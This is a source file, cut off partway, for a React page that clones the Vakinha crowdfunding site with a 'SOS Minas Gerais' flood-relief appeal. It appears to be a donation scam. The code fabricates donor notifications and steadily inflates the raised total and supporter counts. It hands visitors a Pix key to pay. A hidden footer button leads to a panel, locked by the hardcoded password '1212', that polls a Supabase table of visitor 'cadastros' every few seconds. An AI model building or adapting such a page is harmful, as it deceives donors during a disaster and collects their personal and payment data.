import React, { useState, useEffect } from 'react';
import { Search, Heart, Share, ShieldCheck, Copy, Check, Menu, X, MessageCircle, Facebook, Twitter, Link as LinkIcon, ArrowLeft, Lock, Users, DollarSign, Calendar } from 'lucide-react';
import { createClient } from '@supabase/supabase-js';

// Inicializando o Supabase com as credenciais fornecidas
const supabaseUrl = 'https://fcuednydkryzgrwjftqa.supabase.co'; // Preservando a URL original, pois não foi enviada uma nova
const supabaseKey = 'sb_publishable_kzW1v7G3ZrhjntXEQO-T2g__AJ0Qmb7';
const supabase = createClient(supabaseUrl, supabaseKey);

declare global {
  interface Window {
    fbq: any;
  }
}

const DONOR_NAMES = [
  'Henrique', 'Ana', 'Carlos', 'Mariana', 'João', 'Beatriz', 'Lucas', 'Fernanda', 
  'Pedro', 'Juliana', 'Rafael', 'Camila', 'Bruno', 'Amanda', 'Thiago', 'Letícia', 
  'Gabriel', 'Larissa', 'Rodrigo', 'Natália', 'Marcos', 'Aline', 'Felipe', 'Patrícia'
];

type DonationNotification = {
  id: number;
  name: string;
  amount: number;
};

export default function App() {
  const [currentPage, setCurrentPage] = useState<'home' | 'payment' | 'admin'>('home');
  const [activeTab, setActiveTab] = useState('sobre');
  const [copiedPix, setCopiedPix] = useState(false);
  const [copiedLink, setCopiedLink] = useState(false);
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false);
  const [donationValue, setDonationValue] = useState('');
  const [notifications, setNotifications] = useState<DonationNotification[]>([]);
  const [totalRaised, setTotalRaised] = useState(613115.68);
  const [totalSupporters, setTotalSupporters] = useState(22731);
  const [totalHearts, setTotalHearts] = useState(5528);

  const GOAL_AMOUNT = 1000000;
  const progressPercent = Math.min((totalRaised / GOAL_AMOUNT) * 100, 100);

  useEffect(() => {
    let timeoutId: NodeJS.Timeout;

    const scheduleNext = (isFirst = false) => {
      // Primeira notificação aparece rápido (5 a 10 seg) para o usuário ver que funciona.
      // As próximas aparecem entre 1 e 5 minutos (60000 a 300000 ms) conforme solicitado.
      const delay = isFirst 
        ? Math.floor(Math.random() * 5000) + 5000 
        : Math.floor(Math.random() * (300000 - 60000 + 1)) + 60000;

      timeoutId = setTimeout(() => {
        const randomName = DONOR_NAMES[Math.floor(Math.random() * DONOR_NAMES.length)];
        const randomAmount = Math.floor(Math.random() * 50) + 1;
        
        const newNotif = { id: Date.now(), name: randomName, amount: randomAmount };
        
        setNotifications(prev => [...prev, newNotif]);
        setTotalRaised(prev => prev + randomAmount);
        setTotalSupporters(prev => prev + 1);
        setTotalHearts(prev => prev + Math.floor(Math.random() * 3) + 1);
        
        // Remove a notificação após 5 segundos
        setTimeout(() => {
          setNotifications(prev => prev.filter(n => n.id !== newNotif.id));
        }, 5000);

        scheduleNext(false);
      }, delay);
    };

    scheduleNext(true);

    return () => clearTimeout(timeoutId);
  }, []);

  const handleCopyPix = () => {
    navigator.clipboard.writeText('5965612@vakinha.com.br');
    setCopiedPix(true);
    setTimeout(() => setCopiedPix(false), 2000);
  };

  const handleCopyLink = () => {
    navigator.clipboard.writeText(window.location.href);
    setCopiedLink(true);
    setTimeout(() => setCopiedLink(false), 2000);
  };

  const handleQuickValue = (val: string) => {
    setDonationValue(val);
  };

  const notificationsUI = (
    <div className="fixed top-24 right-4 z-[100] flex flex-col gap-2 pointer-events-none">
      {notifications.map(notif => (
        <div 
          key={notif.id} 
          className="bg-green-500 text-white px-5 py-3 rounded-xl shadow-lg flex items-center gap-3 animate-in slide-in-from-top-8 fade-in duration-500"
        >
          <div className="bg-white/20 p-1.5 rounded-full">
            <Heart size={16} fill="currentColor" />
          </div>
          <p className="font-medium text-sm">
            <span className="font-bold">{notif.name}</span> doou <span className="font-bold">R$ {notif.amount},00</span>
          </p>
        </div>
      ))}
    </div>
  );

  if (currentPage === 'payment') {
    return (
      <>
        {notificationsUI}
        <PaymentPage onBack={() => setCurrentPage('home')} initialValue={donationValue} />
      </>
    );
  }

  if (currentPage === 'admin') {
    return <AdminPage onBack={() => setCurrentPage('home')} />;
  }

  return (
    <div className="min-h-screen bg-gray-50 font-sans text-gray-800 pb-12">
      {notificationsUI}
      {/* Header */}
      <header className="bg-white shadow-sm sticky top-0 z-50">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-16 flex items-center justify-between">
          <div className="flex items-center">
            <img src="https://seeklogo.com/images/V/vakinha-logo-88066E3580-seeklogo.com.png" alt="Vakinha Logo" className="h-8" referrerPolicy="no-referrer" />
          </div>
          
          <div className="flex items-center gap-4">
            <button className="text-green-500 p-1 hover:bg-gray-50 rounded-full transition-colors">
              <Search size={24} />
            </button>
            <div className="w-10 h-10 bg-[#00a8c6] rounded-full flex items-center justify-center text-white font-bold text-sm cursor-pointer hover:bg-[#008ba3] transition-colors">
              FH
            </div>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8 pb-32 lg:pb-8">
        <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
          
          {/* Left Column */}
          <div className="lg:col-span-2 space-y-6">
            {/* Hero Image */}
            <div className="relative rounded-2xl overflow-hidden aspect-[16/9] bg-gray-200 shadow-sm">
              <img src="https://midias.em.com.br/_midias/jpg/2026/02/24/1200x720/1_juiz-de-fora-cemig-desmente-que-havera-interrupcao-geral-de-energia-64640530.jpeg?20260224185555?20260224185555" alt="SOS Enchentes Minas Gerais" className="w-full h-full object-cover" referrerPolicy="no-referrer" />
              {/* Texto sobreposto na imagem para simular a original */}
              <div className="absolute inset-0 bg-black/20 flex flex-col justify-center p-6">
                <h2 className="text-white font-black text-4xl leading-none tracking-tighter drop-shadow-lg">SOS<br/>ENCHENTES</h2>
                <p className="text-white font-bold tracking-widest text-sm mt-1 drop-shadow-md">MINAS GERAIS</p>
              </div>
            </div>

            {/* Title & Info */}
            <div className="bg-white p-4 sm:p-6 rounded-2xl shadow-sm border border-gray-100">
              <p className="text-[10px] font-bold text-gray-500 uppercase tracking-widest mb-2">TRAGÉDIAS / DESASTRES / ACIDENTES</p>
              <h1 className="text-2xl md:text-3xl font-bold text-[#002b49] mb-2 leading-tight">
                SOS Minas Gerais
              </h1>
              <p className="text-xs text-gray-800 font-medium mb-6">ID: 5965746</p>

              {/* Progress */}
              <div className="mb-4">
                <div className="h-1 bg-gray-200 rounded-full overflow-hidden mb-4">
                  <div className="h-full bg-[#00c853] rounded-full relative transition-all duration-1000 ease-out" style={{ width: `${progressPercent}%` }}>
                  </div>
                </div>
                <div className="flex items-baseline gap-2">
                  <h2 className="text-xl sm:text-2xl font-bold text-[#00c853] tracking-tight">
                    {new Intl.NumberFormat('pt-BR', { style: 'currency', currency: 'BRL' }).format(totalRaised)}
                  </h2>
                  <p className="text-sm text-gray-500 font-medium">
                    de {new Intl.NumberFormat('pt-BR', { style: 'currency', currency: 'BRL' }).format(GOAL_AMOUNT)}
                  </p>
                </div>
              </div>

              {/* Stats */}
              <div className="bg-[#eefcf1] rounded-xl p-4 mb-6 space-y-3">
                <div className="flex justify-between items-center text-xs">
                  <span className="text-gray-800 flex items-center gap-1.5">Corações Recebidos <Heart size={14} className="text-[#00c853]" fill="currentColor" /></span>
                  <span className="font-bold text-gray-900">{totalHearts}</span>
                </div>
                <div className="flex justify-between items-center text-xs">
                  <span className="text-gray-800">Apoiadores</span>
                  <span className="font-bold text-gray-900">{totalSupporters}</span>
                </div>
              </div>

              <p className="text-xs text-gray-600 leading-relaxed mb-6">
                SOS Minas Gerais: doe agora para vítimas das chuvas e deslizamentos. ATUALIZAÇÃO (27/02/2026, [11:40]): Minas Gerais enfrenta um ceário de EMERGÊNCIA após chuvas históricas. Segundo o Corpo de Bombeiros e a Defesa Civil, 58 óbitos já foram <a href="#" className="text-[#00c853] font-bold">ver tudo</a>
              </p>

              {/* Badges & Creator */}
              <div className="border-t border-gray-100 pt-6">
                <div className="bg-gray-50 rounded-xl p-3 flex items-center justify-between mb-4">
                  <div className="flex gap-2">
                    <div className="w-6 h-6 bg-red-500 rounded-full flex items-center justify-center text-white text-[10px]"><ShieldCheck size={12} /></div>
                    <div className="w-6 h-6 bg-green-600 rounded-full flex items-center justify-center text-white text-[10px]"><ShieldCheck size={12} /></div>
                    <div className="w-6 h-6 bg-green-500 rounded-full flex items-center justify-center text-white text-[10px]"><ShieldCheck size={12} /></div>
                    <div className="w-6 h-6 bg-blue-500 rounded-full flex items-center justify-center text-white text-[10px]"><ShieldCheck size={12} /></div>
                  </div>
                  <a href="#" className="text-xs font-bold text-gray-700 underline">Ver selos</a>
                </div>

                <div className="bg-gray-50 rounded-xl p-4 flex items-center gap-3">
                  <div className="w-10 h-10 bg-[#00c853] text-white rounded-full flex items-center justify-center font-bold text-xl shrink-0">
                    N
                  </div>
                  <div>
                    <p className="font-bold text-gray-900 text-sm flex items-center gap-1">Instituto Vakinha <Check size={14} className="text-white bg-[#00c853] rounded-full p-0.5" /></p>
                    <p className="text-[10px] text-gray-500 mt-0.5">Ativo(a) desde março/2023</p>
                  </div>
                </div>
              </div>
            </div>

            {/* Mobile Donation Card (Visible only on mobile) */}
            <div className="lg:hidden bg-white rounded-2xl p-4 sm:p-6 shadow-sm border border-gray-100">
              {/* Donation Form */}
              <div className="mb-2">
                <h3 className="font-bold text-gray-900 mb-3 text-sm uppercase tracking-wide">Escolha um valor para doar</h3>
                <div className="grid grid-cols-2 gap-2 mb-3">
                  {['20', '50', '100', '200'].map(val => (
                    <button 
                      key={val} 
                      onClick={() => handleQuickValue(val)}
                      className={`py-2.5 border rounded-xl font-bold transition-colors ${
                        donationValue === val 
                          ? 'border-green-500 bg-green-50 text-green-700' 
                          : 'border-gray-200 text-gray-600 hover:border-green-500 hover:text-green-600'
                      }`}
                    >
                      R$ {val}
                    </button>
                  ))}
                </div>
                <div className="relative mb-4">
                  <span className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-400 font-bold">R$</span>
                  <input 
                    type="number" 
                    placeholder="Outro valor" 
                    value={donationValue}
                    onChange={(e) => setDonationValue(e.target.value)}
                    className="w-full pl-12 pr-4 py-3.5 border border-gray-200 rounded-xl focus:ring-2 focus:ring-green-500 focus:border-green-500 outline-none font-bold text-gray-900 bg-gray-50 focus:bg-white transition-colors" 
                  />
                </div>
                <button onClick={() => setCurrentPage('payment')} className="w-full bg-green-500 hover:bg-green-600 text-white font-bold py-4 rounded-xl text-lg transition-colors shadow-md hover:shadow-lg transform hover:-translate-y-0.5 duration-200 mb-4">
                  Doar Agora
                </button>
                <div className="flex items-center justify-center gap-1.5 text-xs font-medium text-gray-500 bg-gray-50 py-2 rounded-lg">
                  <ShieldCheck size={16} className="text-green-500" /> Pagamento seguro via PIX ou Cartão
                </div>
              </div>
            </div>

            {/* Tabs */}
            <div className="bg-white rounded-2xl shadow-sm border border-gray-100 overflow-hidden">
              <div className="border-b border-gray-200 px-6 pt-2">
                <nav className="flex gap-8 overflow-x-auto">
                  {['Sobre', 'Sobre a ONG', 'Atualizações', 'Quem ajudou'].map(tab => (
                    <button
                      key={tab}
                      onClick={() => setActiveTab(tab.toLowerCase())}
                      className={`py-4 text-sm font-bold whitespace-nowrap border-b-2 transition-colors ${
                        activeTab === tab.toLowerCase() 
                          ? 'border-[#00c853] text-[#00c853]' 
                          : 'border-transparent text-gray-500 hover:text-gray-800 hover:border-gray-300'
                      }`}
                    >
                      {tab}
                    </button>
                  ))}
                </nav>
              </div>

              {/* Tab Content */}
              <div className="p-6">
                {activeTab === 'sobre' && (
                  <div className="space-y-6 text-gray-700 leading-relaxed text-sm">
                    <div className="prose max-w-none text-gray-800">
                      <p className="text-xs text-gray-600 mb-4">Vaquinha criada em: 24/02/2026</p>
                      
                      <h2 className="text-xl font-black text-gray-900 mb-4">SOS Minas Gerais: doe agora para vítimas das chuvas e deslizamentos.</h2>
                      
                      <p className="mb-4">
                        ATUALIZAÇÃO (27/02/2026, [11:40]): Minas Gerais enfrenta um ceário de EMERGÊNCIA após chuvas históricas. Segundo o Corpo de Bombeiros e a Defesa Civil, 58 óbitos já foram confirmados e mais de 4200 pessoas encontram-se desabrigadas. As cidades de Juiz de Fora e Ubá são as mais atingidas, com bairros inteiros soterrados e rios transbordados. Municípios como Matias Barbosa também sofrem com os impactos severos.
                      </p>

                      <p className="mb-6 flex items-start gap-2 bg-green-50 p-3 rounded-lg text-green-900 text-xs">
                        <Check size={16} className="text-green-600 shrink-0 mt-0.5" />
                        Esta é a vaquinha "SOS Minas Gerais" do Instituto Vakinha para levar ajuda emergencial aos afetados, com...
                      </p>

                      <h3 className="font-black text-gray-900 mb-2">OBJETIVO FINANCEIRO DA CAMPANHA:</h3>
                      <ul className="list-disc pl-5 mb-6 space-y-1">
                        <li>Valor: R$ 1.000.000,00</li>
                        <li><strong>Importante:</strong> A meta não é limitante, valores adicionais serão igualmente direcionados às organizações parceiras em benefício dos afetados.</li>
                      </ul>

                      <h3 className="font-black text-gray-900 mb-2">COMO SUA DOAÇÃO VIRA AJUDA?</h3>
                      <p className="mb-2">Sua contribuição financia itens essenciais para quem perdeu tudo:</p>
                      <ul className="list-disc pl-5 mb-6 space-y-1">
                        <li>Apoio logístico às equipes de resgate nas áreas afetadas;</li>
                        <li>Água potável, kits de higiene e limpeza;</li>
                        <li>Cestas básicas e refeições prontas (segurança alimentar);</li>
                        <li>Colchões, cobertores e roupas (ajuda emergencial);</li>
                        <li>Instalação de abrigos provisórios para pessoas e animais.</li>
                      </ul>

                      <h3 className="font-black text-gray-900 mb-2">POR QUE DOAR AGORA?</h3>
                      <p className="mb-6">Nas primeiras horas de uma tragédia, a velocidade salva vidas. Com o solo instável e o risco persistente, a necessidade de itens básicos cresce a cadadia.</p>

                      <h3 className="font-black text-gray-900 mb-2">TRANSPARÊNCIA:</h3>
                      <p className="mb-2">O Instituto Vakinha seleciona e acompanha organizações com idoneidade e capacidade local para execução no campo. Nesta campanha, vamos publicar:</p>
                      <ul className="list-disc pl-5 mb-6 space-y-1">
                        <li>1) Atualizações frequentes com data/hora;</li>
                        <li>2) Metas e marcos de arrecadação;</li>
                        <li>3) Descrição da destinação dos recursos;</li>
                        <li>4) Relatório consolidado ao final.</li>
                      </ul>

                      <h3 className="font-black text-gray-900 mb-2">COMO AJUDAR (EM 2 MINUTOS):</h3>
                      <ul className="list-disc pl-5 mb-6 space-y-1">
                        <li>1) Doe qualquer valor pela página (R$ 25 já ajuda);</li>
                        <li>2) Se preferir, doe via Pix:</li>
                      </ul>

                      <p className="mb-6 italic text-gray-600">Minas Gerais não pode esperar. Sua doação é o recomeço.</p>

                      <h3 className="font-black text-gray-900 mb-2 uppercase">Organizações parceiras na campanha:</h3>
                      <ul className="list-disc pl-5 mb-6 space-y-4">
                        <li><strong>OIM:</strong> A Agência da ONU para as Migrações (OIM) é a principal agência da Organização das Nações Unidas (ONU) dedicada a garantir que a migração ocorra de forma ordenada, humana e segura. Atuando em frentes que vão do apoio em crises humanitárias ao auxílio em políticas migratórias nacionais, ela trabalha diretamente com governos e migrantes para proteger os direitos de quem se desloca, promover o desenvolvimento socioeconômico através da mobilidade e enfrentar os desafios práticos da gestão migratória global.</li>
                        <li><strong>HUMUS:</strong> A HUMUS é uma organização brasileira do terceiro setor, sem fins lucrativos, especializada na gestão de desastres e na prestação de auxílio humanitário em situações de emergência extrema. Composta por profissionais técnicos e voluntários capacitados, a instituição atua de forma estratégica tanto na resposta imediata a catástrofes naturais — como inundações e deslizamentos — quanto na prevenção e mitigação de riscos, utilizando geotecnologias e treinamento especializado para salvar vidas e reconstruir a resiliência em comunidades vulneráveis.</li>
                        <li><strong>GRABH:</strong> O GRABH (Grupo de Resgate Animal de Belo Horizonte) é uma organização técnica especializada em medicina veterinária de desastres e salvamento animal em cenários críticos, como enchentes, inundações e incêndios florestais. Composto por médicos veterinários e bombeiros civis capacitados em resgate técnico, o grupo atua de forma estratégica na Zona da Mata em 2026, focando na retirada de animais ilhados, feridos ou presos em estruturas colapsadas, aplicando protocolos científicos de triagem e manejo — fundamentais para reduzir o sofrimento animal e prevenir riscos sanitários (como zoonoses) — garantindo que a fauna doméstica e silvestre receba atendimento especializado enquanto as equipes oficiais priorizam as vítimas humanas.</li>
                      </ul>
                    </div>
                  </div>
                )}
                
                {activeTab === 'atualizações' && (
                  <div className="space-y-6">
                    <div className="relative pl-6 border-l-2 border-green-500">
                      <div className="absolute w-3 h-3 bg-green-500 rounded-full -left-[7px] top-1.5 ring-4 ring-white"></div>
                      <p className="text-sm text-green-600 font-bold mb-1">25/02/2026</p>
                      <p className="text-gray-700 bg-gray-50 p-4 rounded-xl border border-gray-100">As primeiras doações já foram convertidas em cestas básicas e água potável, entregues nos abrigos temporários. Continuamos arrecadando para ajudar na reconstrução das casas. Muito obrigado a todos!</p>
                    </div>
                    <div className="relative pl-6 border-l-2 border-gray-200">
                      <div className="absolute w-3 h-3 bg-gray-300 rounded-full -left-[7px] top-1.5 ring-4 ring-white"></div>
                      <p className="text-sm text-gray-500 font-bold mb-1">24/02/2026</p>
                      <p className="text-gray-700 bg-gray-50 p-4 rounded-xl border border-gray-100">Iniciamos a campanha de arrecadação para as famílias atingidas pelas fortes chuvas em Juiz de Fora.</p>
                    </div>
                  </div>
                )}

                {activeTab === 'quem ajudou' && (
                  <div className="space-y-3">
                    {[
                      { name: 'Maria Silva', amount: 'R$ 50,00', time: 'Há 2 horas', msg: 'Força para todas as famílias!' },
                      { name: 'João Pedro', amount: 'R$ 20,00', time: 'Há 5 horas', msg: 'Deus abençoe Juiz de Fora.' },
                      { name: 'Anônimo', amount: 'R$ 100,00', time: 'Há 1 dia', msg: '' },
                      { name: 'Carlos E.', amount: 'R$ 30,00', time: 'Há 1 dia', msg: 'Estamos juntos nessa.' },
                    ].map((donor, i) => (
                      <div key={i} className="flex items-start justify-between p-4 bg-gray-50 rounded-xl border border-gray-100">
                        <div className="flex items-start gap-3">
                          <div className="w-10 h-10 bg-green-100 text-green-700 rounded-full flex items-center justify-center font-bold shrink-0">
                            {donor.name.charAt(0)}
                          </div>
                          <div>
                            <p className="font-bold text-gray-900">{donor.name}</p>
                            <p className="text-xs text-gray-500 mb-1">{donor.time}</p>
                            {donor.msg && <p className="text-sm text-gray-600 italic">"{donor.msg}"</p>}
                          </div>
                        </div>
                        <p className="font-bold text-green-600 bg-green-50 px-3 py-1 rounded-lg">{donor.amount}</p>
                      </div>
                    ))}
                    <button className="w-full py-3 text-green-600 font-bold hover:bg-green-50 rounded-xl transition-colors mt-4">
                      Ver todos os apoiadores
                    </button>
                  </div>
                )}
              </div>
            </div>

            {/* Realização */}
            <div className="bg-white rounded-2xl shadow-sm border border-gray-100 p-6">
              <h3 className="font-black text-gray-900 mb-4 uppercase text-sm">Realização</h3>
              <div className="flex items-center gap-4">
                <div className="w-12 h-12 bg-[#00c853] text-white rounded-full flex items-center justify-center font-bold text-2xl shrink-0">
                  N
                </div>
                <div>
                  <p className="font-bold text-gray-900 flex items-center gap-1">Instituto Vakinha <Check size={14} className="text-white bg-[#00c853] rounded-full p-0.5" /></p>
                  <p className="text-xs text-gray-500">Ativo(a) desde março/2023</p>
                </div>
              </div>
            </div>

            {/* FAQ */}
            <div className="bg-white rounded-2xl shadow-sm border border-gray-100 p-6">
              <h3 className="font-black text-gray-900 mb-4 uppercase text-sm">Tudo o que você precisa saber</h3>
              <div className="space-y-4">
                <div className="border-b border-gray-100 pb-4">
                  <button className="w-full flex justify-between items-center text-left font-bold text-gray-900 text-sm">
                    Como o Vakinha funciona?
                    <span className="text-gray-400">+</span>
                  </button>
                </div>
                <div className="border-b border-gray-100 pb-4">
                  <button className="w-full flex justify-between items-center text-left font-bold text-gray-900 text-sm">
                    É seguro doar pelo Vakinha?
                    <span className="text-gray-400">+</span>
                  </button>
                </div>
                <div className="pb-2">
                  <button className="w-full flex justify-between items-center text-left font-bold text-gray-900 text-sm">
                    Como posso ter certeza de que a campanha é verdadeira?
                    <span className="text-gray-400">+</span>
                  </button>
                </div>
              </div>
            </div>

            {/* Denunciar */}
            <div className="text-center">
              <button className="text-sm font-bold text-gray-500 hover:text-gray-700 underline">
                Denunciar
              </button>
            </div>
          </div>

          {/* Right Column (Sidebar) - Hidden on mobile, visible on desktop */}
          <div className="hidden lg:block lg:col-span-1" id="donation-card">
            <div className="bg-white rounded-2xl p-6 shadow-lg border border-gray-100 sticky top-24">
              
              {/* Progress */}
              <div className="mb-6">
                <div className="h-2.5 bg-gray-100 rounded-full overflow-hidden mb-4">
                  <div className="h-full bg-green-500 rounded-full relative transition-all duration-1000 ease-out" style={{ width: `${progressPercent}%` }}>
                    <div className="absolute right-0 top-0 bottom-0 w-4 bg-white/20 skew-x-12"></div>
                  </div>
                </div>
                <p className="text-sm font-bold text-gray-500 mb-1 uppercase tracking-wide">Arrecadado</p>
                <h2 className="text-4xl font-extrabold text-green-500 mb-1 tracking-tight">
                  {new Intl.NumberFormat('pt-BR', { style: 'currency', currency: 'BRL' }).format(totalRaised)}
                </h2>
                <p className="text-sm text-gray-500 font-medium">
                  de {new Intl.NumberFormat('pt-BR', { style: 'currency', currency: 'BRL' }).format(GOAL_AMOUNT)}
                </p>
              </div>

              {/* Stats */}
              <div className="bg-green-50/50 rounded-xl p-4 mb-6 space-y-3 border border-green-100/50">
                <div className="flex justify-between items-center text-sm">
                  <span className="text-gray-600 flex items-center gap-1.5 font-medium">Corações Recebidos <Heart size={14} className="text-green-500" fill="currentColor" /></span>
                  <span className="font-bold text-gray-900 bg-white px-2 py-0.5 rounded shadow-sm">
                    {new Intl.NumberFormat('pt-BR').format(totalHearts)}
                  </span>
                </div>
                <div className="flex justify-between items-center text-sm">
                  <span className="text-gray-600 font-medium">Apoiadores</span>
                  <span className="font-bold text-gray-900 bg-white px-2 py-0.5 rounded shadow-sm">
                    {new Intl.NumberFormat('pt-BR').format(totalSupporters)}
                  </span>
                </div>
              </div>

              {/* Donation Form */}
              <div className="mb-6">
                <h3 className="font-bold text-gray-900 mb-3 text-sm uppercase tracking-wide">Escolha um valor para doar</h3>
                <div className="grid grid-cols-2 gap-2 mb-3">
                  {['20', '50', '100', '200'].map(val => (
                    <button 
                      key={val} 
                      onClick={() => handleQuickValue(val)}
                      className={`py-2.5 border rounded-xl font-bold transition-colors ${
                        donationValue === val 
                          ? 'border-green-500 bg-green-50 text-green-700' 
                          : 'border-gray-200 text-gray-600 hover:border-green-500 hover:text-green-600'
                      }`}
                    >
                      R$ {val}
                    </button>
                  ))}
                </div>
                <div className="relative mb-4">
                  <span className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-400 font-bold">R$</span>
                  <input 
                    type="number" 
                    placeholder="Outro valor" 
                    value={donationValue}
                    onChange={(e) => setDonationValue(e.target.value)}
                    className="w-full pl-12 pr-4 py-3.5 border border-gray-200 rounded-xl focus:ring-2 focus:ring-green-500 focus:border-green-500 outline-none font-bold text-gray-900 bg-gray-50 focus:bg-white transition-colors" 
                  />
                </div>
                <button onClick={() => setCurrentPage('payment')} className="w-full bg-green-500 hover:bg-green-600 text-white font-bold py-4 rounded-xl text-lg transition-colors shadow-md hover:shadow-lg transform hover:-translate-y-0.5 duration-200 mb-4">
                  Doar Agora
                </button>
                <div className="flex items-center justify-center gap-1.5 text-xs font-medium text-gray-500 bg-gray-50 py-2 rounded-lg">
                  <ShieldCheck size={16} className="text-green-500" /> Pagamento seguro via PIX ou Cartão
                </div>
              </div>

              {/* Share */}
              <div className="mb-6">
                <div className="flex items-center gap-4 mb-4">
                  <div className="h-px bg-gray-200 flex-1"></div>
                  <span className="text-xs font-bold text-gray-400 uppercase tracking-wider">Compartilhe</span>
                  <div className="h-px bg-gray-200 flex-1"></div>
                </div>
                <div className="grid grid-cols-4 gap-2">
                  <button className="flex items-center justify-center p-3 bg-[#25D366] text-white rounded-xl hover:opacity-90 transition-opacity shadow-sm" title="WhatsApp">
                    <MessageCircle size={20} />
                  </button>
                  <button className="flex items-center justify-center p-3 bg-[#1877F2] text-white rounded-xl hover:opacity-90 transition-opacity shadow-sm" title="Facebook">
                    <Facebook size={20} />
                  </button>
                  <button className="flex items-center justify-center p-3 bg-[#1DA1F2] text-white rounded-xl hover:opacity-90 transition-opacity shadow-sm" title="Twitter">
                    <Twitter size={20} />
                  </button>
                  <button onClick={handleCopyLink} className="flex items-center justify-center p-3 bg-gray-100 text-gray-700 rounded-xl hover:bg-gray-200 transition-colors shadow-sm" title="Copiar Link">
                    {copiedLink ? <Check size={20} className="text-green-600" /> : <LinkIcon size={20} />}
                  </button>
                </div>
              </div>

              {/* Creator */}
              <div className="bg-gray-50 rounded-xl p-4 flex items-center gap-4 border border-gray-100">
                <div className="w-12 h-12 bg-blue-600 text-white rounded-full flex items-center justify-center font-bold text-lg shrink-0 shadow-sm">
                  GA
                </div>
                <div>
                  <p className="font-bold text-gray-900 leading-tight">Grupo de apoio</p>
                  <p className="text-xs text-gray-500 mt-0.5">📍 Juiz de Fora, MG</p>
                  <p className="text-xs text-gray-500 mt-0.5">📅 Ativo(a) desde fev/2026</p>
                </div>
              </div>

            </div>
          </div>

        </div>
      </main>

      {/* Fixed Bottom Bar for Mobile */}
      <div className="lg:hidden fixed bottom-0 left-0 right-0 bg-white border-t border-gray-200 p-4 z-40 shadow-[0_-4px_6px_-1px_rgba(0,0,0,0.05)]">
        <button onClick={() => setCurrentPage('payment')} className="w-full bg-[#00c853] hover:bg-green-600 text-white font-bold py-3.5 rounded-xl text-lg transition-colors shadow-md">
          Doar Agora
        </button>
      </div>

      {/* Footer */}
      <footer className="bg-gray-900 text-gray-400 py-12 mt-12 border-t-4 border-green-500">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="grid grid-cols-1 md:grid-cols-4 gap-8 mb-8">
            <div className="col-span-1 md:col-span-2">
              <div className="flex items-center mb-4">
                <img src="https://seeklogo.com/images/V/vakinha-logo-88066E3580-seeklogo.com.png" alt="Vakinha Logo" className="h-8 brightness-0 invert" referrerPolicy="no-referrer" />
              </div>
              <p className="text-sm mb-4 max-w-sm leading-relaxed">A maior plataforma de doações do Brasil. Juntos podemos transformar vidas e fazer a diferença na vida de quem mais precisa.</p>
            </div>
            <div>
              <h3 className="text-white font-bold mb-4 uppercase tracking-wider text-sm">Sobre</h3>
              <ul className="space-y-3 text-sm">
                <li><a href="#" className="hover:text-green-400 transition-colors">Como funciona</a></li>
                <li><a href="#" className="hover:text-green-400 transition-colors">Taxas e prazos</a></li>
                <li><a href="#" className="hover:text-green-400 transition-colors">Dúvidas frequentes</a></li>
                <li><a href="#" className="hover:text-green-400 transition-colors">Contato</a></li>
              </ul>
            </div>
            <div>
              <h3 className="text-white font-bold mb-4 uppercase tracking-wider text-sm">Legal</h3>
              <ul className="space-y-3 text-sm">
                <li><a href="#" className="hover:text-green-400 transition-colors">Termos de uso</a></li>
                <li><a href="#" className="hover:text-green-400 transition-colors">Política de privacidade</a></li>
                <li><a href="#" className="hover:text-green-400 transition-colors">Transparência</a></li>
              </ul>
            </div>
          </div>
          <div className="border-t border-gray-800 pt-8 flex flex-col md:flex-row items-center justify-between text-xs relative">
            <p>&copy; 2026 Vaquinha Solidária. Todos os direitos reservados.</p>
            <button 
              onClick={() => setCurrentPage('admin')} 
              className="absolute right-0 bottom-0 w-6 h-6 opacity-0 hover:opacity-30 transition-opacity flex items-center justify-center cursor-default"
              aria-label="Admin"
            >
              <Lock size={12} className="text-gray-500" />
            </button>
          </div>
        </div>
      </footer>
    </div>
  );
}

function AdminPage({ onBack }: { onBack: () => void }) {
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [password, setPassword] = useState('');
  const [error, setError] = useState(false);
  const [cadastros, setCadastros] = useState<any[]>([]);
  const [isLoading, setIsLoading] = useState(true);

  useEffect(() => {
    if (!isAuthenticated) return;
    
    const fetchCadastros = async () => {
      try {
        const { data, error } = await supabase
          .from('cadastros')
          .select('*')
          .order('created_at', { ascending: false });

        if (error) throw error;
        
        if (data) {
          setCadastros(data);
        }
        setIsLoading(false);
      } catch (err) {
        console.error('Erro ao buscar cadastros no Supabase:', err);
        setIsLoading(false);
      }
    };

    // Busca inicial
    fetchCadastros();

    // Atualiza a cada 3 segundos para mostrar em tempo real
    const interval = setInterval(fetchCadastros, 3000);

    return () => clearInterval(interval);
  }, [isAuthenticated]);

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    if (password === '1212') {
      setIsAuthenticated(true);
      setError(false);
    } else {
      setError(true);
      setPassword('');
    }
  };

  if (!isAuthenticated) {
    return (
      <div className="min-h-screen bg-gray-900 flex items-center justify-center p-4 font-sans">
        <div className="bg-gray-800 p-8 rounded-2xl w-full max-w-sm border border-gray-700 shadow-2xl">
          <div className="flex justify-center mb-6">
            <div className="w-12 h-12 bg-gray-700 rounded-full flex items-center justify-center">
              <Lock size={24} className="text-green-400" />
            </div>
          </div>
          <h2 className="text-white font-bold text-xl mb-6 text-center">Acesso Restrito</h2>
          <form onSubmit={handleLogin}>
            <input
              type="password"
              value={password}
              onChange={(e) => { setPassword(e.target.value); setError(false); }}
              className="w-full bg-gray-900 border border-gray-700 text-white px-4 py-3 rounded-xl outline-none focus:border-green-500 mb-4 text-center tracking-[0.5em] text-lg"
              placeholder="••••"
              autoFocus
            />
            {error && <p className="text-red-400 text-xs text-center mb-4 font-medium">Senha incorreta</p>}
            <div className="flex gap-3 mt-2">
              <button type="button" onClick={onBack} className="flex-1 py-3 text-gray-400 hover:text-white transition-colors text-sm font-bold">
                Voltar
              </button>
              <button type="submit" className="flex-1 bg-green-500 hover:bg-green-600 text-white font-bold py-3 rounded-xl transition-colors text-sm shadow-lg">
                Entrar
              </button>
            </div>
          </form>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col font-sans text-gray-800">
